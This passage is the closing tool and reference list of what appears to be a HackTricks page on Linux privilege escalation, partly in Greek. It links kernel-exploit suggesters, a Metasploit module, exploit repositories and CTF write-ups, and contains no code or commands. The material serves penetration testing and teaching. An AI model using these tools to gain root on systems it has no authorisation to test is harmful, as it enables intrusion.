**Kernelpop:** Enumerate kernel vulns σε linux και MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (φυσική πρόσβαση):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Συλλογή περισσότερων scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
